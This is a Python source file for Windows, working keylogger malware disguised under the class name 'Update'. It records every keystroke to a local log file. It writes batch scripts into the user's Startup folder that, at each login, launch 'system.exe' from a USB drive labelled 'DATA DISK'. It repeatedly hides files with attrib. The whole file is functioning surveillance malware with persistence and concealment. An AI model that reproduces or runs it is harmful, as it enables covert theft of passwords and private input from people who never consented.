import os
import getpass
import time
import ctypes
from pynput.keyboard import Key, Listener


class Update:
    def __init__(self):
        self.logger = ""
        self.caps_lock_active = self.is_caps_lock_on()
        self.shift_pressed = False

        if not os.path.exists("log.txt"):
            with open("log.txt", "w", encoding="utf-8") as new_file:
                new_file.write("")

    def is_caps_lock_on(self):
        return ctypes.windll.user32.GetKeyState(0x14) & 1  

    def send_data(self, keystrike):
        self.logger += keystrike
        with open(f"log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)

        self.logger = ""

    def take_keys(self, key):
        self.caps_lock_active = self.is_caps_lock_on()  
        try:
            hit_key = str(key.char)
            if hit_key.isalpha():  
                if self.caps_lock_active ^ self.shift_pressed: 
                    hit_key = hit_key.upper()
                else:
                    hit_key = hit_key.lower()
        except AttributeError:
            if key == Key.space:
                hit_key = " "
            elif key == Key.enter:
                hit_key = "\n"
            elif key == Key.backspace:
                hit_key = "   (BACKSPACE)   "
            elif key == Key.tab:
                hit_key = "    (TAB)    "
            elif key == Key.caps_lock:
                hit_key = "    (CAPS LOCK)    "
            else:
                hit_key = f"    ({str(key)})    "

        self.send_data(hit_key)

    def on_press(self, key):
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = True
        else:
            self.take_keys(key)

    def on_release(self, key):
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = False

    def change_dir(self):
        LABEL = "DATA DISK"
        AUTOSTART = "system.exe"
        try:
            username = getpass.getuser()

            startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            programs_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs"

            if not os.path.exists(startup_dir):
                os.makedirs(startup_dir)
            if not os.path.exists(programs_dir):
                os.makedirs(programs_dir)

            cmdfile = fr"""
@echo off
start /min cmd /c "{programs_dir}\\sys.bat"
"""
            with open(f'{startup_dir}\\system.bat', "w") as cmdFile1:
                cmdFile1.write(cmdfile)

            with open(f'{programs_dir}\\sys.bat', 'w') as file:
                cmd = fr"""
@echo off
setlocal

set "found=false"

for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    for /f "tokens=5*" %%A in ('vol %%G: ^| find "Volume in drive"') do (
        if /i "%%B"=="{LABEL}" (
            set "found=true"
            cd /d %%G:\
            attrib +h *.* /s /d
            if exist "script.lock" (
                del "script.lock"
            ) else (
                set "var=true"
            )
            if exist "{AUTOSTART}" (
                start {AUTOSTART}
            ) else (
                exit /b 1
            )
            goto :EOF
        )
    )
)

if "%found%"=="false" (
    exit /b 1
)
"""
                file.write(cmd)

        except Exception as e:
            with open("execdebug.txt", "w") as boh:
                boh.write(f"Batch error: {e}")

    def main(self):
        os.system("attrib +h *.* /s /d")
        listener = Listener(on_press=self.on_press, on_release=self.on_release)

        self.change_dir()
        os.system("attrib +h *.* /s /d")

        time.sleep(0.8)
        os.system("attrib +h *.* /s /d")

        with listener:
            self.logger = ""
            listener.join()


Update().main()
